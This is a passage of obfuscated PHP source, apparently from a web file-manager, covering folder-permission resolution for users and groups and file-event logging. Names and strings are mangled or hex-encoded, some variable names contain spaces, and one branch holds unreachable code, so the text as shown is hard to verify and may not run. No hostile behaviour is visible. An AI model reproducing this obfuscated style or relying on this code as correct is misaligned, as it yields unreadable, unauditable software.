array_merge(array($ÈïÀ¯»“[$ÓÒü‚öØ[191]]), array_reverse($Ü†‘©ã£)); $İşóÇ¿ = !1; foreach ($Ü†‘©ã£ as $º‘ÈŸ®Ÿ) { if (!isset($§Ç±‘äñ[$º‘ÈŸ®Ÿ])) { continue; } $İÌ­š×¹ = $this->authMake($§Ç±‘äñ[$º‘ÈŸ®Ÿ], $ÒËƒ¼»š); if ($İÌ­š×¹[$ÓÒü‚öØ[556]]) { $İşóÇ¿ = $İÌ­š×¹; break; } } if (!$Ëòğ«Ä) { return $İşóÇ¿; } if (!$İşóÇ¿ && $ˆ¬çç¼) { $İşóÇ¿ = $this->groupAuthInfo($ˆ¬çç¼, $úŒğ¢½¬); } if (!$İşóÇ¿) { $ğëº®ö = Model($ÓÒü‚öØ[605])->getInfo($úŒğ¢½¬); $Šª ÎçŸ = explode($ÓÒü‚öØ[50], trim($ğëº®ö[$ÓÒü‚öØ[604]], $ÓÒü‚öØ[50])); $Šª ÎçŸ = array_reverse($Šª ÎçŸ); foreach ($Šª ÎçŸ as $¢ù) { if ($¢ù == $ÓÒü‚öØ[228] || $¢ù == $„á÷‚Ò) { continue; } $¡×¼Á…Ù = $this->groupRootAuth($¢ù, $ÒËƒ¼»š); if (!$¡×¼Á…Ù) { continue; } $İşóÇ¿ = $this->groupAuthInfo($¡×¼Á…Ù, $¢ù); break; } } if (!$İşóÇ¿ || $İşóÇ¿[$ÓÒü‚öØ[503]] <= 0) { $½—æğÓœ = $this->authDeepCheck($ÈïÀ¯»“[$ÓÒü‚öØ[191]], $ÒËƒ¼»š); if ($½—æğÓœ) { $İşóÇ¿ = $½—æğÓœ; } } return $İşóÇ¿; } private function userIsRoot($ÂÇïÓ¬ú = false) { $Œøµ÷Š· =& $_SERVER[µÅ˜º…æ]; if (!$ÂÇïÓ¬ú && KodUser::isRoot()) { return !0; } $¬ÏÚª©É = Model($Œøµ÷Š·[617])->getInfo($ÂÇïÓ¬ú); $³—œÇÊ¢ = Model($Œøµ÷Š·[2371])->listData($¬ÏÚª©É[$Œøµ÷Š·[2372]]); if ($³—œÇÊ¢ && $³—œÇÊ¢[$Œøµ÷Š·[595]][$Œøµ÷Š·[2375]] == 1) { return !0; } return !1; } private function sourceAuthInfo($àñİ–Œ) { $¹Ï½Ü¥… =& $_SERVER[µÅ˜º…æ]; $œÏ¦Ş•› = Model($¹Ï½Ü¥…[1534]); $ÛÜ÷‡Ä÷ = $œÏ¦Ş•›->sourceInfo($àñİ–Œ); if (!$ÛÜ÷‡Ä÷) { return !1; } $œÏ¦Ş•›->groupPathDisplay($ÛÜ÷‡Ä÷); $ñáÒ¨Úê = array($ÛÜ÷‡Ä÷); $ñáÒ¨Úê = $œÏ¦Ş•›->_listAppendPath($ñáÒ¨Úê, !1); $ÛÜ÷‡Ä÷ = $ñáÒ¨Úê[0]; $£˜Óç¾ = $ÛÜ÷‡Ä÷[$¹Ï½Ü¥…[602]]; if (isset($ÛÜ÷‡Ä÷[$¹Ï½Ü¥…[610]])) { $âçŠ¨ï = explode($¹Ï½Ü¥…[8], trim($ÛÜ÷‡Ä÷[$¹Ï½Ü¥…[602]], $¹Ï½Ü¥…[8])); array_shift($âçŠ¨ï); $£˜Óç¾ = $ÛÜ÷‡Ä÷[$¹Ï½Ü¥…[608]] . $¹Ï½Ü¥…[2395] . implode($¹Ï½Ü¥…[8], $âçŠ¨ï); } return array($¹Ï½Ü¥…[32] => $ÛÜ÷‡Ä÷[$¹Ï½Ü¥…[32]], $¹Ï½Ü¥…[191] => $ÛÜ÷‡Ä÷[$¹Ï½Ü¥…[191]], $¹Ï½Ü¥…[87] => KodIO::make($ÛÜ÷‡Ä÷[$¹Ï½Ü¥…[191]]), $¹Ï½Ü¥…[602] => $£˜Óç¾); } private function groupAuthInfo($Íû“ªÉ¼, $Å”¹ª·) { $¯Ğ¡‘ºâ =& $_SERVER[µÅ˜º…æ]; $¯šÓ¿ª¾ = Model($¯Ğ¡‘ºâ[605])->getInfo($Å”¹ª·); return array($¯Ğ¡‘ºâ[2396] => intval($Íû“ªÉ¼[$¯Ğ¡‘ºâ[502]]), $¯Ğ¡‘ºâ[2386] => $Íû“ªÉ¼, $¯Ğ¡‘ºâ[2397] => LNG($¯Ğ¡‘ºâ[2398]), $¯Ğ¡‘ºâ[2392] => array($¯Ğ¡‘ºâ[509] => $¯šÓ¿ª¾[$¯Ğ¡‘ºâ[32]], $¯Ğ¡‘ºâ[87] => KodIO::make($¯šÓ¿ª¾[$¯Ğ¡‘ºâ[90]][$¯Ğ¡‘ºâ[191]]), $¯Ğ¡‘ºâ[2399] => $¯šÓ¿ª¾[$¯Ğ¡‘ºâ[609]])); } protected function groupRootAuth($”ã’ˆãÚ, $°ØñêîÀ = false) { $­…¾‚„í =& $_SERVER[µÅ˜º…æ]; $°ØñêîÀ = $°ØñêîÀ ? $°ØñêîÀ : USER_ID; $ÙÌ¶®¾› = $°ØñêîÀ . $­…¾‚„í[2400] . $”ã’ˆãÚ; static $ŸúÒ…ğ = array(); if (isset($ŸúÒ…ğ[$ÙÌ¶®¾›])) { return $ŸúÒ…ğ[$ÙÌ¶®¾›]; } $Àö£ïı‹ = Model($­…¾‚„í[605])->getInfo($”ã’ˆãÚ); $âÄˆÃüÎ = $this->userGroupList($°ØñêîÀ); $‹ãÄ…İÏ = isset($âÄˆÃüÎ[$”ã’ˆãÚ]) ? $âÄˆÃüÎ[$”ã’ˆãÚ][$­…¾‚„í[502]] : !1; if ($‹ãÄ…İÏ && Model($­…¾‚„í[591])->authCheckAction($‹ãÄ…İÏ[$­…¾‚„í[502]], $­…¾‚„í[1565])) { $ŸúÒ…ğ[$ÙÌ¶®¾›] = $‹ãÄ…İÏ; return $‹ãÄ…İÏ; } $¾ãî‚… = $this->sourceAuthSelect($Àö£ïı‹[$­…¾‚„í[90]][$­…¾‚„í[191]]); $È¢Ì”Óø = $¾ãî‚… ? $this->authMake($¾ãî‚…, $°ØñêîÀ) : !1; $şôšú™â = $È¢Ì”Óø ? $È¢Ì”Óø[$­…¾‚„í[556]] : !1; $ŸúÒ…ğ[$ÙÌ¶®¾›] = $şôšú™â ? $şôšú™â : $‹ãÄ…İÏ; return $ŸúÒ…ğ[$ÙÌ¶®¾›]; } public function authOwnerApply($ó±Å½øà) { $¸™Ìóà =& $_SERVER[µÅ˜º…æ]; if (empty($ó±Å½øà[$¸™Ìóà[502]]) || isset($ó±Å½øà[$¸™Ìóà[1584]]) && $ó±Å½øà[$¸™Ìóà[1584]]) { return $ó±Å½øà; } if (AuthModel::authCheckRoot($ó±Å½øà[$¸™Ìóà[502]][$¸™Ìóà[503]])) { return $ó±Å½øà; } $‘Õëèƒˆ = Model($¸™Ìóà[1534])->parentLevelArray($ó±Å½øà[$¸™Ìóà[604]]); $‘Õëèƒˆ = array_merge(array($ó±Å½øà[$¸™Ìóà[191]]), array_reverse($‘Õëèƒˆ)); $À©µïÅÜ = $this->sourceAuthSelect($‘Õëèƒˆ); $Úê±Ïñ = array(); $šºÏä€õ = array(); foreach ($À©µïÅÜ as $º­¾óôš => $…„û®‚¨) { $ÉîÜİŞÊ = $this->authFolderOwnerUser($…„û®‚¨); $Úê±Ïñ[$º­¾óôš] = $ÉîÜİŞÊ; $šºÏä€õ = array_merge($šºÏä€õ, $ÉîÜİŞÊ[$¸™Ìóà[684]]); if ($ÉîÜİŞÊ[$¸™Ìóà[2401]]) { break; } } if (count($šºÏä€õ) == 0) { $šºÏä€õ = $this->authFolderOwnerGroup($ó±Å½øà[$¸™Ìóà[589]]); } $šºÏä€õ = array_unique($šºÏä€õ); if (AuthModel::authCheckRoot($ó±Å½øà[$¸™Ìóà[502]][$¸™Ìóà[503]])) { $šºÏä€õ[] = USER_ID; } $ó±Å½øà[$¸™Ìóà[502]][$¸™Ìóà[2402]] = Model($¸™Ìóà[597])->userListInfo($šºÏä€õ); return $ó±Å½øà; } private function authFolderOwnerGroup($üóÏá¾˜) { $ÍâŞÈÃö =& $_SERVER[µÅ˜º…æ]; $¶²ŒÔ“® = Model($ÍâŞÈÃö[2275])->where(array($ÍâŞÈÃö[1496] => $üóÏá¾˜))->select(); $şŞÕŠ€å = array(); if (!$¶²ŒÔ“®) { return $şŞÕŠ€å; } foreach ($¶²ŒÔ“® as $Òıè›êà) { $òşÆ×È = $this->authInfo($Òıè›êà); if (AuthModel::authCheckRoot($òşÆ×È[$ÍâŞÈÃö[502]])) { $şŞÕŠ€å[] = $Òıè›êà[$ÍâŞÈÃö[1593]]; } } return $şŞÕŠ€å; } private function authFolderOwnerUser($ÆÓÏë…¦) { $„—¥™ßà =& $_SERVER[µÅ˜º…æ]; $‰™¶µÓ– = array(); $›àá…× = !1; foreach ($ÆÓÏë…¦ as $ë™¬ùâ) { $œÑ­Şİ« = $this->authInfo($ë™¬ùâ); if ($ë™¬ùâ[$„—¥™ßà[589]] == $„—¥™ßà[228]) { $›àá…× = !0; } if ($ë™¬ùâ[$„—¥™ßà[188]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($œÑ­Şİ«[$„—¥™ßà[502]])) { $‰™¶µÓ–[] = $ë™¬ùâ[$„—¥™ßà[589]]; } } } return array($„—¥™ßà[684] => $‰™¶µÓ–, $„—¥™ßà[2401] => $›àá…×); } public function authMake($î‹ËÔİö, $›ÕÀ´Õİ = false) { $–¿ÓÙÅÖ =& $_SERVER[µÅ˜º…æ]; $óª‡‡ñ‰ = $this->authArrayCheck($î‹ËÔİö, $›ÕÀ´Õİ); if ($óª‡‡ñ‰[$–¿ÓÙÅÖ[2382]]) { $óª‡‡ñ‰[$–¿ÓÙÅÖ[2382]] = $this->sourceAuthInfo($óª‡‡ñ‰[$–¿ÓÙÅÖ[2382]]); } return $óª‡‡ñ‰; } public function authArrayCheck($®…°½Üä, $ºŠÖó¨— = false) { $ğÚÉµÌÃ =& $_SERVER[µÅ˜º…æ]; if (!$®…°½Üä) { return array($ğÚÉµÌÃ[503] => 0, $ğÚÉµÌÃ[556] => !1, $ğÚÉµÌÃ[2397] => $ğÚÉµÌÃ[12]); } $ºŠÖó¨— = $ºŠÖó¨— ? $ºŠÖó¨— : USER_ID; $ãò‹Ì’­ = 0; $ğ—Ëó¼Ñ = 0; $“ÜşÌÆÇ = 0; $”Ä×âşÌ = 0; $½Âƒåéì = 0; $ÓùåËŞ¨ = 0; $‡è¤°î = 0; $‡ªÇãß = 0; $íâØô—­ = 1000; $Ù¢¼©ñ’ = 0; $¸Á‘¼ìú = 0; $±§û‹—ò = 0; $ğîÆòâ– = 0; $“¹Ô…€™ = 0; foreach ($®…°½Üä as $‚Ôõ§Ø‡) { $üèò© = $this->authInfo($‚Ôõ§Ø‡); if (!$üèò©) { continue; } $ÑâÅä½‰ = $‚Ôõ§Ø‡[$ğÚÉµÌÃ[589]]; $ÔæÃ¯Ï§ = $‚Ôõ§Ø‡[$ğÚÉµÌÃ[191]]; $Â¯¨ªÅ = intval($üèò©[$ğÚÉµÌÃ[502]]); if ($‚Ôõ§Ø‡[$ğÚÉµÌÃ[188]] == SourceModel::TYPE_USER && $ÑâÅä½‰ == $ºŠÖó¨—) { $ãò‹Ì’­ = !0; $“ÜşÌÆÇ = $üèò©; $ğ—Ëó¼Ñ = $Â¯¨ªÅ; $”Ä×âşÌ = $ÔæÃ¯Ï§; } else { if ($‚Ôõ§Ø‡[$ğÚÉµÌÃ[188]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ÑâÅä½‰, $ºŠÖó¨—)) { $½Âƒåéì = !0; $ê²ÀïÛ = $this->groupStepToUserGroup($ÑâÅä½‰, $ºŠÖó¨—); if ($ê²ÀïÛ < $íâØô—­) { $íâØô—­ = $ê²ÀïÛ; $ÓùåËŞ¨ = $Â¯¨ªÅ; $‡è¤°î = $üèò©; $Ù¢¼©ñ’ = $ÑâÅä½‰; $‡ªÇãß = $ÔæÃ¯Ï§; } if ($ê²ÀïÛ == $íâØô—­ && $Â¯¨ªÅ >= $ÓùåËŞ¨) { $ÓùåËŞ¨ = $Â¯¨ªÅ; $‡è¤°î = $üèò©; $Ù¢¼©ñ’ = $ÑâÅä½‰; $‡ªÇãß = $ÔæÃ¯Ï§; } } else { if (!$ÑâÅä½‰ || $ÑâÅä½‰ == $ğÚÉµÌÃ[228]) { $¸Á‘¼ìú = !0; $ğîÆòâ– = $üèò©; $±§û‹—ò = $Â¯¨ªÅ; $“¹Ô…€™ = $ÔæÃ¯Ï§; } } } } if ($ãò‹Ì’­) { $˜®ğêÄ = $ğ—Ëó¼Ñ; $üèò© = $“ÜşÌÆÇ; $à˜ºıä‡ = $”Ä×âşÌ; $ä˜½îæç = LNG($ğÚÉµÌÃ[2403]); } else { if ($½Âƒåéì) { $˜®ğêÄ = $ÓùåËŞ¨; $üèò© = $‡è¤°î; $à˜ºıä‡ = $‡ªÇãß; $ıãªı•ì = Model($ğÚÉµÌÃ[605])->getInfo($Ù¢¼©ñ’); $ä˜½îæç = $ğÚÉµÌÃ[173] . $ıãªı•ì[$ğÚÉµÌÃ[609]] . $ğÚÉµÌÃ[2404] . LNG($ğÚÉµÌÃ[2405]); } else { if ($¸Á‘¼ìú) { $˜®ğêÄ = $±§û‹—ò; $üèò© = $ğîÆòâ–; $à˜ºıä‡ = $“¹Ô…€™; $ä˜½îæç = LNG($ğÚÉµÌÃ[2384]); } else { $˜®ğêÄ = 0; $üèò© = !1; $ä˜½îæç = $ğÚÉµÌÃ[12]; $à˜ºıä‡ = $ğÚÉµÌÃ[12]; } } } $ƒ±µ­Î‘ = array($ğÚÉµÌÃ[2396] => intval($˜®ğêÄ), $ğÚÉµÌÃ[2386] => $üèò©, $ğÚÉµÌÃ[2397] => $ä˜½îæç, $ğÚÉµÌÃ[2392] => $à˜ºıä‡); return $ƒ±µ­Î‘; } private function groupContainUser($¦‘™¸ÓÑ, $¶‹¡İ¯Ä = false) { return in_array($¦‘™¸ÓÑ, $this->userGroupParents($¶‹¡İ¯Ä)); } private function groupStepToUserGroup($à¥¢´í£, $Í‹¿ÎÂş = false) { $¹®©áŸî =& $_SERVER[µÅ˜º…æ]; $İè‘£íÌ = $this->userGroupList($Í‹¿ÎÂş); $×´°Åö = 1000; $ôÉ¡şé† = $GLOBALS[$¹®©áŸî[6]][$¹®©áŸî[92]][$¹®©áŸî[2288]] == 1; $ô·úĞâş = $ôÉ¡şé† ? 3 : 2; foreach ($İè‘£íÌ as $—Ë›¼÷æ) { if ($—Ë›¼÷æ[$¹®©áŸî[1496]] == $à¥¢´í£) { return 0; } $½ÊÄºñ– = explode($¹®©áŸî[50], trim($—Ë›¼÷æ[$¹®©áŸî[604]], $¹®©áŸî[50])); if ($½ÊÄºñ–[0] == $¹®©áŸî[228] && count($½ÊÄºñ–) > $ô·úĞâş) { $ÏÛ½·º = array_reverse(array_slice($½ÊÄºñ–, $ô·úĞâş)); $ßğ’ó—˜ = array_search($à¥¢´í£, $ÏÛ½·º); if ($ßğ’ó—˜ !== !1 && $ßğ’ó—˜ + 1 <= $×´°Åö) { $×´°Åö = $ßğ’ó—˜ + 1; } } } return $×´°Åö; } private function userGroupList($è¶ˆù€¶ = false, $Õëâ”Ã = false) { $¦Ş›õòò =& $_SERVER[µÅ˜º…æ]; static $«É÷´Ø = array(); if (isset($«É÷´Ø[$è¶ˆù€¶])) { return $«É÷´Ø[$è¶ˆù€¶]; } if (!$Õëâ”Ã) { $Õëâ”Ã = Model($¦Ş›õòò[617])->getInfo($è¶ˆù€¶); } $«É÷´Ø[$è¶ˆù€¶] = array_to_keyvalue($Õëâ”Ã[$¦Ş›õòò[1495]], $¦Ş›õòò[1496]); return $«É÷´Ø[$è¶ˆù€¶]; } public function userGroupParents($ç¸ÙÖ±) { $Ğ×¾ëˆ¨ =& $_SERVER[µÅ˜º…æ]; static $Ë™«æ™ = array(); $ç¸ÙÖ± = $ç¸ÙÖ± ? $ç¸ÙÖ± : USER_ID; if (isset($Ë™«æ™[$ç¸ÙÖ±])) { return $Ë™«æ™[$ç¸ÙÖ±]; } $Š™ó÷ªø = $this->userGroupList($ç¸ÙÖ±); $ı œÃÛË = array(); $°»•ß¼ = $GLOBALS[$Ğ×¾ëˆ¨[6]][$Ğ×¾ëˆ¨[92]][$Ğ×¾ëˆ¨[2288]] == 1; $”ÇÚ¨‚Ş = $°»•ß¼ ? 3 : 2; foreach ($Š™ó÷ªø as $‘¶ÑËÀ†) { $ï¦í¹Õ’ = array($‘¶ÑËÀ†[$Ğ×¾ëˆ¨[1496]]); $šŸ¾£÷ı = explode($Ğ×¾ëˆ¨[50], trim($‘¶ÑËÀ†[$Ğ×¾ëˆ¨[604]], $Ğ×¾ëˆ¨[50])); if ($šŸ¾£÷ı[0] == $Ğ×¾ëˆ¨[228] && count($šŸ¾£÷ı) > $”ÇÚ¨‚Ş) { $‘û©ÛŞ = array_slice($šŸ¾£÷ı, $”ÇÚ¨‚Ş); $ï¦í¹Õ’ = array_merge($ï¦í¹Õ’, array_reverse($‘û©ÛŞ)); } $ı œÃÛË = array_merge($ı œÃÛË, $ï¦í¹Õ’); } $Ë™«æ™[$ç¸ÙÖ±] = array_unique($ı œÃÛË); return $Ë™«æ™[$ç¸ÙÖ±]; } public function authTargetInfoMake($¤®úØõñ) { $¿¹ØˆÚ× =& $_SERVER[µÅ˜º…æ]; $¯œÆ·ˆò = array(); $´œãß°÷ = array(); foreach ($¤®úØõñ as $Üò––Øû) { if ($Üò––Øû[$¿¹ØˆÚ×[188]] == SourceModel::TYPE_USER) { $¯œÆ·ˆò[] = intval($Üò––Øû[$¿¹ØˆÚ×[589]]); } else { if ($Üò––Øû[$¿¹ØˆÚ×[188]] == SourceModel::TYPE_GROUP) { $´œãß°÷[] = intval($Üò––Øû[$¿¹ØˆÚ×[589]]); } } } if ($¯œÆ·ˆò) { $¯œÆ·ˆò = Model($¿¹ØˆÚ×[597])->userListInfo($¯œÆ·ˆò); } if ($´œãß°÷) { $Ş¯èƒèº = array($¿¹ØˆÚ×[2268] => array($¿¹ØˆÚ×[507], $´œãß°÷)); $´œãß°÷ = Model($¿¹ØˆÚ×[605])->field($¿¹ØˆÚ×[2406])->where($Ş¯èƒèº)->select(); $´œãß°÷ = array_to_keyvalue($´œãß°÷, $¿¹ØˆÚ×[1496]); } return array($¿¹ØˆÚ×[2407] => $¯œÆ·ˆò, $¿¹ØˆÚ×[2408] => $´œãß°÷); } public function authInfo($öÎºĞİ) { $‚ğšÖàÙ =& $_SERVER[µÅ˜º…æ]; if ($öÎºĞİ[$‚ğšÖàÙ[1641]]) { $Ñô¨ìà• = Model($‚ğšÖàÙ[591])->listData($öÎºĞİ[$‚ğšÖàÙ[1641]]); if (!$Ñô¨ìà•) { return !1; $Ï´—œá = Model($‚ğšÖàÙ[591])->listData(); $¸Ø£¿½é = array_filter_by_field($Ï´—œá, $‚ğšÖàÙ[502], $‚ğšÖàÙ[228]); return $¸Ø£¿½é; } $¾¡ÛşêŒ = array_field_key($Ñô¨ìà•, array($‚ğšÖàÙ[487], $‚ğšÖàÙ[32], $‚ğšÖàÙ[502], $‚ğšÖàÙ[2202], $‚ğšÖàÙ[2203])); $¾¡ÛşêŒ[$‚ğšÖàÙ[2409]] = $öÎºĞİ; return $¾¡ÛşêŒ; } else { return array($‚ğšÖàÙ[508] => 0, $‚ğšÖàÙ[2187] => $öÎºĞİ[$‚ğšÖàÙ[2344]], $‚ğšÖàÙ[509] => $‚ğšÖàÙ[12], $‚ğšÖàÙ[2202] => $‚ğšÖàÙ[2410]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\x72\x63\x65\137\x65\x76\145\x6e\x74"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\x65\x54\151\x6d\x65", "\x74\x69\x6d\145", "\x69\x6e\163\x65\162\164", "\x66\165\x6e\x63\x74\151\x6f\x6e"), array("\x64\x65\x73\x63", '', "\151\156\163\x65\x72\164\x2c\x75\160\x64\141\164\145\54\163\145\x6c\145\143\164", "\x6a\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Ÿ…ù¹òÔ, $öÒìÛñÇ, $Áò¿šÇ¥ = '') { $ÔÉ½ÊŞã =& $_SERVER[µÅ˜º…æ]; if (!$this->eventSave) { return; } $‡ŞâŒ¯ = Model($ÔÉ½ÊŞã[1534])->sourceInfo($Ÿ…ù¹òÔ); if (!$‡ŞâŒ¯) { return !1; } if ($this->isDisableEvent($‡ŞâŒ¯, $öÒìÛñÇ)) { return; } if ($Áò¿šÇ¥ && is_string($Áò¿šÇ¥)) { $Áò¿šÇ¥ = array($ÔÉ½ÊŞã[2221] => $Áò¿šÇ¥); } $ÄÂÅ½‚É = KodUser::id(); $ã¤…ªêß = array($ÔÉ½ÊŞã[506] => $Ÿ…ù¹òÔ, $ÔÉ½ÊŞã[2411] => $‡ŞâŒ¯[$ÔÉ½ÊŞã[190]], $ÔÉ½ÊŞã[2412] => $‡ŞâŒ¯[$ÔÉ½ÊŞã[32]], $ÔÉ½ÊŞã[602] => !empty($‡ŞâŒ¯[$ÔÉ½ÊŞã[602]]) ? $‡ŞâŒ¯[$ÔÉ½ÊŞã[602]] : $ÔÉ½ÊŞã[12], $ÔÉ½ÊŞã[1967] => $ÄÂÅ½‚É, $ÔÉ½ÊŞã[511] => $öÒìÛñÇ, $ÔÉ½ÊŞã[1969] => $Áò¿šÇ¥); $this->addSystemLog($öÒìÛñÇ, $ã¤…ªêß); unset($ã¤…ªêß[$ÔÉ½ÊŞã[2412]], $ã¤…ªêß[$ÔÉ½ÊŞã[602]]); return $this->add($ã¤…ªêß); } private function addSystemLog($ööíÛÑ½, $äùú­Ø) { $òŒˆ‰ÍÓ =& $_SERVER[µÅ˜º…æ]; if ($ööíÛÑ½ == $òŒˆ‰ÍÓ[2413]) { $ööíÛÑ½ = $äùú­Ø[$òŒˆ‰ÍÓ[540]][$òŒˆ‰ÍÓ[2414]]; } else { if (in_array($ööíÛÑ½, array($òŒˆ‰ÍÓ[1563], $òŒˆ‰ÍÓ[2415]))) { $ööíÛÑ½ = $äùú­Ø[$òŒˆ‰ÍÓ[540]][$òŒˆ‰ÍÓ[168]]; } } $Ñ¡«‰‚‚ = array_merge($äùú­Ø, array($òŒˆ‰ÍÓ[2416] => $äùú­Ø[$òŒˆ‰ÍÓ[191]], $òŒˆ‰ÍÓ[2417] => $äùú­Ø[$òŒˆ‰ÍÓ[2417]])); Hook::trigger($òŒˆ‰ÍÓ[2418], $òŒˆ‰ÍÓ[2419] . $ööíÛÑ½, $äùú­Ø); Model($òŒˆ‰ÍÓ[2128])->addLog($òŒˆ‰ÍÓ[2419] . $ööíÛÑ½, $Ñ¡«‰‚‚); } private function isDisableEvent($«Ä†ÔÆÜ, $ş‘Çı¤‚) { $Ü½·Şº… =& $_SERVER[µÅ˜º…æ]; if ($«Ä†ÔÆÜ[$Ü½·Şº…[188]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ş‘Çı¤‚ == $Ü½·Şº…[1335]) { return !1; } return !0; } public function eventCreate($óı½øğ, $„Õê ä°) { $ú´ò·í =& $_SERVER[µÅ˜º…æ]; $ê“¼·ùş = Model($ú´ò·í[1534])->sourceInfo($óı½øğ); $¦Ş¨š—‰ = array($ú´ò·í[2414] => $„Õê ä°, $ú´ò·í[32] => $ê“¼·ùş[$ú´ò·í[32]]); return $this->addEvent($óı½øğ, $ú´ò·í[2413], $¦Ş¨š—‰); } public function eventFileEdit($˜ıÂÄøÑ) { $œ¥Ä¢¹‹ =& $_SERVER[µÅ˜º…æ]; $­Ë¶¿Ó“ = array($œ¥Ä¢¹‹[2420] => $_SERVER[$œ¥Ä¢¹‹[2421]], $œ¥Ä¢¹‹[2422] => strtolower(ACTION)); if (isset($GLOBALS[$œ¥Ä¢¹‹[7]][$œ¥Ä¢¹‹[1624]])) { $­Ë¶¿Ó“[$œ¥Ä¢¹‹[1624]] = $œ¥Ä¢¹‹[91]; } return $this->addEvent($˜ıÂÄøÑ, $œ¥Ä¢¹‹[1562], $­Ë¶¿Ó“); } public function eventRecycle($ƒœµˆêï, $ŸìØÂşš) { return $this->addEvent($ƒœµˆêï, $_SERVER[µÅ˜º…æ][2415], $ŸìØÂşš); } private static $_removeLast = ''; public function eventRemove($»şÂÒİŞ) { $üÎå±ìë =& $_SERVER[µÅ˜º…æ]; self::$_removeLast = $»şÂÒİŞ; $—ËğãÂ = Model($üÎå±ìë[1534])->sourceInfo($»şÂÒİŞ); $ş€´”ÅØ = array_field_key($—ËğãÂ, array($üÎå±ìë[191], $üÎå±ìë[557], $üÎå±ìë[520], $üÎå±ìë[604])); $ØÇÏ‹¥ñ = array($üÎå±ìë[168] => $—ËğãÂ[$üÎå±ìë[32]], $üÎå±ìë[2422] => ACTION, $üÎå±ìë[2423] => $ş€´”ÅØ); return $this->addEvent($—ËğãÂ[$üÎå±ìë[190]], $üÎå±ìë[1335], $ØÇÏ‹¥ñ); } public function eventShare($×Ù…ŠË, $ª¼î÷êÛ) { return $this->addEvent($×Ù…ŠË, $_SERVER[µÅ˜º…æ][1563], $ª¼î÷êÛ); } public function eventMove($àÏ ÷šÍ, $ÅÀĞö©, $İÂŠÆéº) { $ıÂÏæ±¯ =& $_SERVER[µÅ˜º…æ]; if (self::$_removeLast == $àÏ ÷šÍ) { return; } $œ××„® = Model($ıÂÏæ±¯[1534]); $¶¿Ô´¬â = $œ××„®->sourceInfo($àÏ ÷šÍ); $úµà¤üû = $œ××„®->sourceInfo($ÅÀĞö©); $êª¡³Šã = $œ××„®->sourceInfo($İÂŠÆéº); $¬¸ŞºéÍ = array($ıÂÏæ±¯[1347] => $ÅÀĞö©, $ıÂÏæ±¯[2424] => $úµà¤üû[$ıÂÏæ±¯[32]], $ıÂÏæ±¯[2382] => !empty($úµà¤üû[$ıÂÏæ±¯[602]]) ? $úµà¤üû[$ıÂÏæ±¯[602]] : $ıÂÏæ±¯[12], $ıÂÏæ±¯[1348] => $İÂŠÆéº, $ıÂÏæ±¯[2425] => $êª¡³Šã[$ıÂÏæ±¯[32]], $ıÂÏæ±¯[2426] => !empty($êª¡³Šã[$ıÂÏæ±¯[602]]) ? $êª¡³Šã[$ıÂÏæ±¯[602]] : $ıÂÏæ±¯[12]); $this->addEvent($àÏ ÷šÍ, $ıÂÏæ±¯[643], $¬¸ŞºéÍ); $¶¿Ô´¬â = $œ××„®->sourceInfo($àÏ ÷šÍ); $¬¸ŞºéÍ = array($ıÂÏæ±¯[191] => $¶¿Ô´¬â[$ıÂÏæ±¯[191]], $ıÂÏæ±¯[32] => $¶¿Ô´¬â[$ıÂÏæ±¯[32]]); $this->addEvent($ÅÀĞö©, $ıÂÏæ±¯[2427], $¬¸ŞºéÍ); } public function eventCopy($Û¬¸ó­¿) { $this->eventCreate($Û¬¸ó­¿, $_SERVER[µÅ˜º…æ][641]); } public function eventRename($˜ŸÆèæÆ, $•ŸÕ‡Âó, $Š­˜ÂÍ­) { $ŒõÂˆŞ =& $_SERVER[µÅ˜º…æ]; $—Áğ³ = array($ŒõÂˆŞ[1347] => $•ŸÕ‡Âó, $ŒõÂˆŞ[1348] => $Š­˜ÂÍ­); return $this->addEvent($˜ŸÆèæÆ, $ŒõÂˆŞ[1547], $—Áğ³); } public function eventAddComment($Œ‚Éˆ£¹, $¦×Ÿ¿¿ß) { return $this->addEvent($Œ‚Éˆ£¹, $_SERVER[µÅ˜º…æ][2428], $¦×Ÿ¿¿ß); } public function eventAddDesc($ëİàøˆÀ, $›¼ï‚š‰) { return $this->addEvent($ëİàøˆÀ, $_SERVER[µÅ˜º…æ][2429], $›¼ï‚š‰); } public function listBySource($Âş”Ş¿È) { $·ÜÛÔ =& $_SERVER[µÅ˜º…æ]; $Ò¿Š“©˜ = Model($·ÜÛÔ[1534])->sourceInfo($Âş”Ş¿È); $í÷Ó—Îñ = array($·ÜÛÔ[506] => $Âş”Ş¿È); if ($Ò¿Š“©˜[$·ÜÛÔ[500]] == $·ÜÛÔ[91]) { $¾¡á¾Æ¤ = 20000; $÷Æû‡«³ = array($·ÜÛÔ[604] => array($·ÜÛÔ[473], $Ò¿Š“©˜[$·ÜÛÔ[604]] . $Ò¿Š“©˜[$·ÜÛÔ[191]] . $·ÜÛÔ[636])); $Ó¼Û®°¬ = Model($·ÜÛÔ[1534])->field($·ÜÛÔ[191])->order($·ÜÛÔ[2430])->where($÷Æû‡«³)->limit($¾¡á¾Æ¤)->select(); $±ÅÇ¸Ö = array_to_keyvalue($Ó¼Û®°¬, $·ÜÛÔ[12], $·ÜÛÔ[191]); if ($±ÅÇ¸Ö >= $¾¡á¾Æ¤) { $ª¡‰×£ = Model($·ÜÛÔ[1534])->listChildrenDeep($Âş”Ş¿È, $¾¡á¾Æ¤, 3); $±ÅÇ¸Ö = array_merge($±ÅÇ¸Ö, $ª¡‰×£, array($Âş”Ş¿È . $·ÜÛÔ[463])); } $í÷Ó—Îñ = array($·ÜÛÔ[191] => array($·ÜÛÔ[7], array_unique($±ÅÇ¸Ö))); } $í÷¦ÖÜÑ = $this->where($í÷Ó—Îñ)->order($·ÜÛÔ[2431])->selectPage(); if ($í÷¦ÖÜÑ[$·ÜÛÔ[443]][$·ÜÛÔ[444]] == 0) { $í÷¦ÖÜÑ[$·ÜÛÔ[443]][$·ÜÛÔ[444]] = 1; $í÷¦ÖÜÑ[$·ÜÛÔ[446]] = array(array($·ÜÛÔ[506] => $Âş”Ş¿È, $·ÜÛÔ[2411] => $Ò¿Š“©˜[$·ÜÛÔ[190]], $·ÜÛÔ[1967] => $Ò¿Š“©˜[$·ÜÛÔ[541]], $·ÜÛÔ[511] => $·ÜÛÔ[2432], 